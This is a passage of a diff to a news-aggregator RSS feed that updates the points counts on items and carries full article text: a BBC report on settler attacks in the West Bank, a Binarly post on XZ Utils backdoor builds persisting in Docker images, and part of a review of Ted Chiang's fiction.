800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="eager" alt="Fred Scott/BBC Several masked men run down a dry hill carrying various weapons"><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Masked settlers ran into the Palestinian farmland</figcaption></p></figure><div data-component="text-block"><p>His family have farmed olives here on land near Turmus Aya, for generations, making it a target for extremist settlers who think killing Palestinian trees and livestock will also kill the idea of a Palestinian State, by forcing residents like Brahim off their land.</p><p>"Fear is natural," Brahim had told me, looking up at the ridge where tarpaulin flapped at the settlers' lookout post in front of a few caravans and makeshift homes.  "But there's something stronger than fear that drives me to stay here – the scent of my ancestors and an attachment dating back hundreds of years – even if I pay the price with my blood."</p><p>As the masked men run towards us, we pull back to the road and drive a safe distance away.</p><p>Within minutes, some of Brahim's neighbours from the surrounding farms and villages gather with catapults and stones to confront the attackers.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="lazy" alt="Fred Scott/BBC Brahim Hamaiel stands next to a cut down olive tree in the West Bank. He wears a blue shirt and jeans in a dry field with mountains on the horizon. "><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Brahim Hamaiel stands next to the broken remains of his olive trees</figcaption></p></figure><div data-component="text-block"><p>Vegetation by the side of the road is set on fire, its smoke signalling the site of the confrontation, as settlers on a quad bike chase away a volunteer emergency crew trying to reach a farmhouse in the middle of the field.</p><ul><li><a target="_self" href="https://www.bbc.co.uk/news/articles/cyv3rl9prp6o">'Stop shooting! My daughter is dead': Woman killed as West Bank power struggle rages</a></li></ul><p>This is now a familiar routine. Palestinians living in these villages south of Nablus say there are attacks and confrontations on their lands every week, and that settlers are using these kinds of tactics to take over the land, field by field.</p><p>But the speed and spread of this attack is breathtaking.</p><p>In little more than an hour, dozens of settlers had fanned out across the hills.  We watched as they broke into an isolated building, and methodically set fire to vehicles and homes.</p><p>Shepherds on the furthest ridge rushed their flocks away, as the hillside behind them broke into flames, smoke billowing up from several places.</p><p>By then, Palestinians arriving from across the area to help their neighbours found the main access road blocked by the Israeli army, as the destruction continued.</p><p>One Palestinian was reportedly beaten by settlers, and the army later told us that both sides had hurled rocks at each other, and that Palestinians had burned tyres.  It said four Israeli civilians received medical treatment at the scene.</p><p>Among the crowd waiting near the army roadblock, we found Rifa Said Hamail, her frantic gestures giving way to a warm smile and embrace when we spoke to her.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp" loading="lazy" alt="Fred Scott/BBC A large expanse of land with cars dotted across. Dark smoke billows up towards the sky in the right hand corner where a fire rages on. "><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Israeli settlers set fire to vehicles and homes</figcaption></p></figure><div data-component="text-block"><p>Rifa told us her husband was trapped in their farmhouse near Brahim's olive farm, and surrounded by settlers, but that the army wouldn't let her pass.</p><p>"Every other day the settlers do this to us – they attack us, cut down the olive trees, and burn the farms," she said.  "This is not a life. No one can stop them. We have nothing to resist them with. They have weapons, we have nothing."</p><p>We later learned that settlers had torched part of their property, and that Rifa's husband had been left with cuts to his face and leg, after being hit with rocks.</p><p>The Israeli organisation Peace Now, which monitors the spread of settlements in the West Bank, says the number of outposts – and settler aggression – has multiplied since the Hamas attacks on Israel in October 2023, and the Gaza War that followed.</p><ul><li><a target="_self" href="https://www.bbc.co.uk/news/articles/c20gnvz1975o">Palestinian olive harvest under threat from Israeli attacks and restrictions</a></li></ul><p>Since the beginning of last year, it says, some 100 outposts have appeared across the West Bank.  It also found that hundreds of square kilometres of land had been taken over by settlers in the past few years using the same violent pattern of intimidation – encouraged, it says, by government support and a lack of proper law enforcement by Israel.</p><p>Last week, Israel's far-right Finance Minister, Bezalel Smotrich, announced the creation of thousands of new housing units in a large West Bank settlement bloc further south, saying it would "bury the idea of a Palestinian state".</p><p>Between 5-11 August, the UN Office for Humanitarian Affairs documented at least 27 settler attacks against Palestinians that resulted in casualties, property damage or both, across two dozen different communities.  These attacks, it said, led to the displacement of 18 households.</p><p>We weren't able to speak to any of the settlers involved in the attack we witnessed.  The local settlers' council told us there were elements on both sides seeking provocation, which it strongly condemned.</p><p>Brahim told us he had filed two separate complaints about the attacks on his land, but few Palestinians here have much faith in Israeli justice or security forces, saying repeatedly that they protect only the settlers.</p><p>One of the volunteer emergency crews who came to help during the clashes on Saturday told me the Israeli army had prevented them from reaching the scene.</p><p>"We were trying to rescue the young men, when the army came, honking at us and telling us to get away from here," Yahya al-Khatib said. </p><p>"We were volunteers wearing our vests. We're not here to attack or harm settlers. We want to put out fires and treat injured people. But they [the army] stop us and stand in our way."</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="lazy" alt="Fred Scott/BBC Mother of 18-year-old Hamdan Abu-Elaya cries at his funeral, after he was shot and killed by Israel troops"><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Mother of 18-year-old Hamdan Abu-Elaya cries at his funeral, after he was shot and killed by Israel troops</figcaption></p></figure><div data-component="text-block"><p>Tensions between local residents and settlers are complicated by the increasingly heavy control of Israeli forces across the West Bank, which has seen the evacuation and widespread demolition of refugee camps across the northern West Bank.</p><p>From January to June this year, the UN found that 149 Palestinians were killed by Israeli settlers or soldiers in the occupied West Bank.  Nine Israelis were killed by Palestinians.</p><p>Hours after the clashes that erupted around Brahim's farm on Saturday, another Palestinian casualty was added to that grim tally.</p><p>Eighteen-year-old Hamdan Abu-Elaya was shot and killed by Israeli troops in al- Mughayyir village, a few miles from Brahim's field.</p><p>His mother told us he'd gone to see the fires lit by settlers nearby.  "I raised him for 18 years, and he was gone in a minute," she said.</p><p>We asked the Israeli army what happened.  It said "terrorists" had thrown rocks and Molotov cocktails at troops in the village, and that soldiers had "responded with fire to remove the threat".</p><p>Hundreds crowded into Hamdan's house for his funeral on Sunday, as his body was carried in for his mother to say goodbye.</p><p>His father, Ameen Abu Elaya, raging to friends and family, said he refused to show the Israelis his tears.</p><p>"They thought if they killed our son, we would leave," he said. "I will not shout and scream and say 'why has he gone?'  I'm not sad that he passed. I encourage young men to do anything they can against the criminal occupier."</p><p>At the local mosque, there was a hero's welcome for Hamdan's body as it was carried in for the funeral prayer – vast Palestinian flags hung alongside those of Fatah and Hamas from the roofs and windows; crowds lining the path of the bier.</p><p>In the language of this conflict, each birth and each burial only strengthens the ties to the land.</p><p><i id="additional-reporting-by-morgan-gisholt-minard">Additional reporting by Morgan Gisholt Minard</i></p></div></article></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Prime Number Grid (232 pts)]]></title>
+            <title><![CDATA[Prime Number Grid (235 pts)]]></title>
             <link>https://susam.net/primegrid.html</link>
             <guid>44949162</guid>
             <pubDate>Tue, 19 Aug 2025 07:33:09 GMT</pubDate>
@@ -1381,7 +2290,7 @@ or if you prefer: the question isn't whether or not XML and XSLT are worth savin
 </div>]]></description>
         </item>
         <item>
-            <title><![CDATA[How to Build a Medieval Castle (174 pts)]]></title>
+            <title><![CDATA[How to Build a Medieval Castle (180 pts)]]></title>
             <link>https://archaeology.org/issues/september-october-2025/features/how-to-build-a-medieval-castle/</link>
             <guid>44948352</guid>
             <pubDate>Tue, 19 Aug 2025 04:49:35 GMT</pubDate>
@@ -1613,7 +2522,7 @@ that lifts stone blocks and mortar up to the parapet of the castle’s curtain w
             </section></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[OpenMower – An open source lawn mower (507 pts)]]></title>
+            <title><![CDATA[OpenMower – An open source lawn mower (529 pts)]]></title>
             <link>https://github.com/ClemensElflein/OpenMower</link>
             <guid>44946996</guid>
             <pubDate>Tue, 19 Aug 2025 00:35:08 GMT</pubDate>
@@ -1729,7 +2638,7 @@ There may be patents and / or laws prohibiting you of doing so.</p>
 </article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[XZ Utils Backdoor Still Lurking in Docker Images (102 pts)]]></title>
+            <title><![CDATA[XZ Utils Backdoor Still Lurking in Docker Images (105 pts)]]></title>
             <link>https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images</link>
             <guid>44946783</guid>
             <pubDate>Tue, 19 Aug 2025 00:07:22 GMT</pubDate>
@@ -1970,7 +2879,7 @@ There may be patents and / or laws prohibiting you of doing so.</p>
 </div><p><em>Table 2. Second-order docker images (based on the compromised Docker images) containing the XZ Utils backdoor. The “Latest Tag?” column reports whether the affected tag is the latest available one.</em></p><p>‍</p><p>The previous table lists the <strong>second-order images</strong> containing the XZ Utils backdoor. While some appear to be personal projects, other images may be used in enterprise environments. In a recursive fashion, these images could themselves serve as base images, leading to the creation of impacted <strong>third-order images </strong>and so on and so forth. Doing such a recursive exploration is the only way to gain meaningful insights into the extent of the backdoor’s propagation within the Docker ecosystem.</p><h2>Disclosing our findings&nbsp;</h2><p>Upon discovering this issue, Binarly immediately <a href="https://github.com/debuerreotype/docker-debian-artifacts/issues/246">notified</a> the Debian maintainers and requested removal, but the affected images remain in place.</p><p>‍</p><figure><p><img src="https://cdn.prod.website-files.com/65dc9e6c7079139a2996b5d7/689ae537f117e310436353ab_AD_4nXc8f8eEhkAHhHT6sQV6c-atsM_xB7jw9a3E021uOPoyuRAwxJiIRqb0yE7xi7CBEAPuT0SoASelqC2rBWIATTrhI1m1hy-7EiClBahZ2_7IVrHoNf80HJBy2Hm2LXJJi2dmHz8_PQ.png" loading="lazy" alt=""></p><figcaption>Figure 1. Response from the Debian maintainer to our disclosure</figcaption></figure><p>We only partially agree with this response: while it is true that users should rely on up-to-date images, leaving publicly available Docker images that contain a potential network-reachable backdoor poses a significant security risk. Even if the practical impact of this issue is somewhat limited, given that exploitation requires the backdoor key owners to have network access to the infected device or container with the SSH service running.&nbsp;</p><p>Nonetheless, our discovery underscores how even short-lived backdoored builds can remain unnoticed and persist in container registries for a very long time.</p><h2>Responding to “XZ Utils”-like incidents with the Binarly Transparency Platform</h2><p>Security incidents affecting the software supply chain are more frequent than ever. This is one of the key motivations for building the Binarly Transparency Platform: we want to empower security researchers, product security teams and organizations with the right tools they need to detect and remediate threats effectively.&nbsp;&nbsp;&nbsp;&nbsp;</p><p>From day one BTP customers had access to a precise analysis developed by our research team to detect IFUNC-based hooking, which is the same technique used in the XZ backdoor. This is the same technology that powers <a href="http://xz.fail/">xz.fail</a>, a free scanning tool that Binarly released to support the broader community and help affected organizations to respond to this threat.</p><p>One of the latest additions to our platform, unveiled last week at Black Hat USA, is the integration of YARA rules. Part of this integration is a new <strong>Rule Playground</strong> designed to help platform users to develop YARA rules. In just a few minutes, organizations can scan their entire software portfolio using YARA rules, whether developed internally or sourced from the broader security community.</p><h2>Conclusion</h2><p>The xz-utils backdoor incident demonstrates that even short-lived malicious code can remain unnoticed in official container images for a long time, and that can propagate in the Docker ecosystem. The delay underscores how these artifacts may silently persist and propagate through CI pipelines and container ecosystems, reinforcing the critical need for continuous binary-level monitoring beyond simple version tracking.</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Ted Chiang: The Secret Third Thing (232 pts)]]></title>
+            <title><![CDATA[Ted Chiang: The Secret Third Thing (248 pts)]]></title>
             <link>https://linch.substack.com/p/ted-chiang-review</link>
             <guid>44946774</guid>
             <pubDate>Tue, 19 Aug 2025 00:05:59 GMT</pubDate>
@@ -1978,7 +2887,7 @@ There may be patents and / or laws prohibiting you of doing so.</p>
 <div id="readability-page-1" class="page"><div><article><div dir="auto"><p>I really like Ted Chiang’s writing.</p><p>I think he's probably the best science fiction short story writer alive, and possibly the best short story writer, period.</p><p><span>I've read every one of his stories at least twice, and The Merchant and the Alchemist's Gate more like seven times. I’ve noticed many of his readers, including some of his most positive reviewers</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-1-171116224" target="_self" rel="">1</a></span><span>, miss one key point or another of his works, and thus don't fully appreciate his genius.</span></p><p>This review covers what he does extremely well, especially unique elements that other science fiction writers have not done as well, or at all.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!H6ea!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!H6ea!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 424w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 848w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1272w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png" width="477" height="477" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1456,&quot;width&quot;:1456,&quot;resizeWidth&quot;:477,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!H6ea!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 424w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 848w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1272w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>Science fiction critics often divide the genre into:</p><ul><li><p><span>"hard" science fiction: aka </span><em>engineering</em><span> fiction, stories built on scientifically accurate extrapolations of real physics and technology (think Arthur C. Clarke)</span></p></li><li><p><span>"soft" science fiction: aka science </span><em>fantasy</em><span>, which uses scientific trappings as window dressing for character-driven or sociological stories (think Star Wars).</span></p></li></ul><p><span>Ted Chiang has written stories plausibly categorized as either, but more excitingly, many of his stories are </span><em>neither</em><span>. He often writes what I think of as true </span><em>science</em><span> fiction, where the </span><em>principles of science themselves</em><span> are meaningfully different from our world, but still internally consistent.</span></p><p><span>In </span><em>Omphalos</em><span>, Young Earth Creationism is empirically true</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-2-171116224" target="_self" rel="">2</a></span><span>. Astronomers can only see light from stars 6,000 light-years away. Fossilized trees have centers with no rings. The first God-created humans lack belly buttons. The scientists in that story keep discovering multiple independent lines of evidence that converge on creationism: because in that universe, they're simply correct.</span></p><p><span>In </span><em>Seventy-Two Letters</em><span>, technology springs from Jewish Kabbalah. Golems and divine names drive industrial progress in a steampunk world</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-3-171116224" target="_self" rel="">3</a></span><span>.</span></p><p><span>Excitingly, he does this not just with natural sciences but social sciences as well. In </span><em>Story of Your Life</em><span>, strong </span><a href="http://sapir-whorf/" rel="">Sapir-Whorf</a><span> (the idea that language significantly constrains thought) isn't a largely discredited linguistic hypothesis, but the key to navigating First Contact with alien minds that experience past and future as equally present.</span></p><p>This comes up in his other stories as well:</p><ul><li><p><span>In </span><em>Exhalation,</em><span> thermodynamics appear to work differently</span></p></li><li><p><span>In </span><em>Division By Zero</em><span>, mathematics itself is broken from within.</span></p></li><li><p><span>In </span><em>Hell Is the Absence of God</em><span>, divine intervention is empirically observable and follows consistent rules</span></p></li></ul><p><span>Many of his readers, even in their otherwise rave reviews, miss this. Multiple reviewers complain about how the science in his stories are “unrealistic” (e.g. strong Sapir-Whorf is “discredited”). They expected </span><em>hard</em><span> science fiction; Chiang was doing something different. Chiang created different universes with internally self-consistent scientific laws, using science fiction and alternative science as a vehicle for exploring philosophical progress and human relationships.</span></p><p><span>Science fiction writers used to </span><em>like</em><span> technology. For some reason, this has become increasingly uncommon, even passé. Doubly so for Western writers, and quadruply so for Western, literary, “humanist” writers.</span></p><p><span>Now it’s hip and trendy to think of every new technology as the </span><a href="https://x.com/AlexBlechman/status/1457842724128833538?lang=en" rel="">Torment Nexus</a><span>. Most science fiction today feels like </span><a href="https://en.wikipedia.org/wiki/Black_Mirror" rel="">Black Mirror,</a><span> which ran 7 seasons with exactly one happy ending.</span></p><p><span>Chiang bucks this trend. </span><a href="https://www.newyorker.com/magazine/2019/05/13/science-fiction-doesnt-have-to-be-dystopian" rel="">Joyce Carol Oates</a><span>:</span></p><blockquote><p>It is both a surprise and a relief to encounter fiction that [...] ask[s] anew philosophical questions that have been posed repeatedly through millennia to no avail. Chiang’s materialist universe is a secular place, in which God, if there is one, belongs to the phenomenal realm of scientific investigation and usually has no particular interest in humankind. But it is also a place in which the natural inquisitiveness of our species leads us to ever more astonishing truths, and an alliance with technological advances is likely to enhance us, not diminish us. Human curiosity, for Chiang, is a nearly divine engine of progress.</p></blockquote><p><span>In the hands of a lesser (or perhaps just more pessimistic) writer, many of the technologies and ideas Chiang explores will have an accursed quality to them, a monkey’s paw that curls into delivering a future much worse than a more innocent, pastoral past. Chiang resists those cliches. In </span><em>The Truth of Fact, The Truth of Feeling</em><span>, memory augmentation technology allows the narrator to understand his own self-deceptions, and work towards becoming a better person and reconciling with loved ones and even himself. In </span><em>Liking What You See: A Documentary</em><span>, a technology that gives users acquired face-blindness allows the main characters to meditate on the nature of human beauty and the shallowness inherent in privileging the beautiful.</span></p><p>Even in situations where the story is overall tragic, like when the characters are faced with existential crisis (in the individual sense), or existential catastrophe (in the world-ending sense), technology isn't the villain but the vehicle for understanding unbearable truths (whether about the world or about ourselves).</p><p><span>Chiang consistently shows us the potential of technology to help us become </span><em>more</em><span> human, and have a deeper appreciation for the world and our place in it.</span></p><p><em>“Compatibilism is a philosophical stance that reconciles free will with determinism. It argues that free will, understood as the ability to act according to one's desires, is compatible with the idea that all events, including human actions, are causally determined by prior events. Essentially, compatibilists believe that even if our choices are predetermined, we can still be considered free and morally responsible if those choices are a result of our own internal states, like desires and intentions.”</em></p><p><span>Does that make sense to you? I’m not sure it does to me. In practice, compatibilism says something like “</span><em>free will in the normal, pretheoretic sense of the term, doesn’t exist. Your choices still meaningfully matter nonetheless. You can’t meaningfully get out of the bind philosophically. What you can do, however, is make peace with it.”</em></p><p>Chiang makes this realization visceral. From The Merchant and the Alchemist's Gate:</p><blockquote><p>“My journey to the past had changed nothing, but what I had learned had changed everything...Nothing erases the past. There is repentance, there is atonement, and there is forgiveness. That is all, but that is enough.”</p></blockquote><p><span>“That is all, but that is enough” on the surface sounds like a </span><a href="https://philosophytalk.org/blog/deepities-and-bullshit/" rel="">deepity</a><span>, but I genuinely find it more moving than anything else I’ve read on free will, determinism, or compatibilism.</span></p><p>When Chiang uses time travel as a motif, the stories differ from typical time travel stories. Because causation is a closed loop, knowing the future does not give you special access to it, and Chiang’s characters tend to not fight the future (successfully or otherwise).</p><p><span>In Story of Your Life [SPOILERS], the narrator learns an atemporal alien language and begins experiencing past and future as equally real.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-4-171116224" target="_self" rel="">4</a></span><span> It takes her some time to make peace with it, but eventually she fully accepts the truth of determinism. She understands that life is full of tragedy, including that her daughter will die young, but life is full of beauty too. With both regret and awe, she sets forth on the path that she was destined to take</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-5-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-5-171116224" target="_self" rel="">5</a></span><span>.</span></p><p>This is compatibilism from the inside. In both stories, the characters discover they cannot change what will happen, but this knowledge transforms how they experience what must happen: with forgiveness, acceptance, and even joy.</p><p><span>As a friend of mine puts it, “he treats philosophical ideas as lived experiences.”The mathematician in </span><em>Division by Zero</em><span> doesn't just intellectually understand that mathematics is broken; she experiences it as a personal catastrophe, on par with (and concurrent with) her marriage's collapse. In </span><em>Lifecycle of Software Objects</em><span>, the “we are the parents of our mind-children” metaphor for building sentient AI systems becomes quite literal.</span></p><p>I've reread all his stories not just because I love his writing, but because they often mean something different the second time through. Like those optical illusions where seeing the duck in the rabbit changes the image forever, his endings don't surprise so much as illuminate.</p><p>In a sense, this narrative technique is compatibilism as literary form: the ending was always determined, but discovering it still matters. Knowing where you're headed changes how you experience the journey, not whether you take it.</p><p>Notably, he achieves this without cheap tricks or twist endings (however foreshadowed), but something deeper. The endings feel inevitable rather than clever. This technique is so difficult that it's surprising he's managed it repeatedly, using different approaches each time.</p><p>Chiang combines these unique factors that he does exceptionally well with strengths that he shares with other top literary science fiction writers: simple yet beautiful prose, diverse settings, a rigorous understanding of science, philosophy, and human psychology, and appealing, interesting, and diverse characters.</p><p>He is probably the best science fiction short story writer alive, and possibly the best short story writer in general.</p><p><span>Is Chiang perfect? Of course not. I won't belabor obvious points like his nonfictional views on current-generation LLMs being surprisingly shallow</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-6-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-6-171116224" target="_self" rel="">6</a></span><span>, or his lack of output being tragic for a generational talent</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-7-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-7-171116224" target="_self" rel="">7</a></span><span>.</span></p><p>Instead, I'll focus on two points: weaknesses in portraying how entire societies interface with technology, and his lack of home runs outside of compatibilism.</p><p>I’m an intellectual dilettante. I’m widely read in many fields, and an expert in none. But to the extent I have any real expertise, it’s probably the intersection of the social sciences and technology. And Chiang is surprisingly weak here.</p><p>Chiang’s scientific imagination is strongest at the very macro level (What would the objective physical evidence look like if God created Earth 6,000 years ago?) and the very micro level: This is one person, a named character. How would she and her husband interface with technology? How would technology radically change her life and her self-perception? Chiang’s much weaker at the middle level, where we consider how societies and civilizations collectively face novel technologies.</p><p><span>In </span><em>Anxiety is the Dizziness of Freedom</em><span>, people invented a new Prism(™) that allows them to talk to copies in nearby universes. Chiang treats this technology as an interesting tool to explore his favorite questions of free will, determinism, and what does it mean to be a person, etc.</span></p><p>I think he doesn’t understand the power of this singularity-level technology he just introduced.</p><p>The ability to send bits across parallel universes is just insane in terms of economic and experimentation value. For example, pharmaceutical companies can do $100 billion trials for all sorts of novel drugs, and trade the results of this information with their clones in other universes. Massive R&amp;D projects in general can be done in parallel across different universes, as long as the results can be compressed in enough bits to be sent over these prisms.</p><p>More than that, you can now have not just individual or small-group level studies but societal-wide or even multiverse-wide ones! Wondering whether raising interest rates can cause recessions? Just conduct RCTs across multiverses (and if they can’t coordinate on RCTs, even the observational data would be insanely useful)!</p><p>While the main characters work through existential crises and their mundane, human worries, the rest of society should be accelerating at breakneck speed toward doom, utopia, or something else equally fascinating. Chiang doesn't explore this, even as backdrop.</p><p>While his fictional portrayals of compatibilism are probably the world's best, and he's covered different angles repeatedly, his other philosophical explorations don't achieve the same resonance. Having something both philosophically deep and emotionally resonant is genuinely hard. So I don’t want to be overly critical. But perhaps the lack of attempts on new ideas is not unrelated to his extreme perfectionism and sparse output?</p><p><span>I cannot recommend Chiang more highly. If you could only read one science fiction book this 